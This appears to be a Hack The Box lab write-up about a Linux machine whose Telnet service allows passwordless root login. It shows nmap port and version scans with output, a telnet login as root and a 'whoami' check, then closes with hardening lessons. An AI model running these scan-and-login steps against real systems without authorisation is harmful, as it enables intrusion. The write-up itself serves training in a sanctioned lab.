---

title: "HTB Telnet Writeup"
date: 2026-06-01 14:00:00 -0500
categories: [HackTheBox, Starting Point]
tags: [htb, telnet, nmap, linux, writeup]
description: "Basic Hack The Box writeup for a Linux machine exposing Telnet with passwordless root login."
toc: true
---------

## Recon

I started with a full TCP port scan to identify exposed services:

```bash
nmap -p- -sS --min-rate 5000 -Pn -n -oN allports <IP>
```

```text
Nmap scan report for 10.129.145.234
Host is up (0.10s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
23/tcp open  telnet

# Nmap done at Sun Apr 26 16:35:30 2026 -- 1 IP address (1 host up) scanned in 14.99 seconds
```

The scan showed that only TCP port `23` was open, which usually indicates Telnet.

Then I ran a targeted scan against port `23` to gather service and version information:

```bash
nmap -p23 -sVC -sS --min-rate 5000 -Pn -n -oN targeted <IP>
```

```text
Nmap scan report for 10.129.145.234
Host is up (0.081s latency).

PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Apr 26 16:37:29 2026 -- 1 IP address (1 host up) scanned in 22.21 seconds
```

At this point, I knew the target was a Linux machine exposing a Telnet service.

## Vulnerability Discovery

Telnet is an insecure remote administration protocol because it sends data in plaintext. In this case, the main issue was even worse: the `root` user could log in without a password.

I tested the Telnet login manually:

```bash
telnet <IP>
```

When prompted for a username, I used:

```text
root
```

The machine allowed access without requiring a password.

## Exploitation

After logging in as `root`, I had privileged access to the system.

```bash
telnet <IP>
```

```text
login: root
```

Once inside, I could enumerate the system and read the flag.

```bash
whoami
```

```text
root
```

## Conclusion

The machine was vulnerable because it exposed Telnet and allowed passwordless login as `root`.

The key findings were:

* TCP port `23` was open.
* The service was identified as `Linux telnetd`.
* The `root` account did not require a password.
* Successful login resulted in root-level access.

## Tools Used

* `nmap`
* `telnet`

## Lessons Learned

This machine demonstrates why Telnet should not be exposed and why privileged accounts must never allow passwordless remote login. A secure configuration should disable Telnet, use SSH instead, and enforce strong authentication.
